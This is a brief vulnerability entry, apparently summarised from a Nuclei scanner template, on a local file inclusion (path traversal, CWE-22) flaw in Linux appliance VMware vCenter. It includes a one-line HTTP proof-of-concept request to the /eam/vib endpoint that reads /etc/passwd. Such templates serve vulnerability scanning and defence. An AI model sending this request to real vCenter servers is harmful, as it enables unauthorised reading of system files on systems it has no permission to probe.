# Nuclei Template: Linux Vmware Vcenter - Local File Inclusion
**Template ID:** vmware-vcenter-lfi-linux
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`vmware-vcenter-lfi-linux.yaml`)

## Vulnerability Information & PoC

## Description
Linux appliance based Vmware Vcenter is vulnerable to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/eam/vib?id=/etc/passwd
```

